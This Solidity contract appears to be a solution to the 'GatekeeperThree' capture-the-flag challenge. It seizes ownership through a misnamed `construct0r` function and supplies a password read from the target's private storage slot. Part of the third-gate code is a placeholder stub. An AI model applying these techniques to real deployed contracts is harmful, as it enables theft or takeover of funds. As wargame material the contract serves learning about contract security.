// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Task.sol";

contract GateKeeprThreeSolution {
    GatekeeperThree public victim;

    constructor (address _victim) {
        victim = GatekeeperThree(payable(_victim));
    }

    function gateOneSolution() public {
        victim.construct0r();
    }

    function gateTwoSolution() public {
        // web3.eth.getStorageAt("0x32072f79e2D63FcA1427C502A6cbec38054B384C", 2, console.log)
        victim.getAllowance(0x00000000000000000000000000000000000000000000000000000000649068b4);
    }

    //function gateThreeSolution() public 
    function send(uint amount) public pure returns (bool) {
        if (amount == 0.001 ether) {
            return false;
        } else {
            // do something
            return true;
        }
    }

    function openDoor() public {
        victim.enter();
    }

}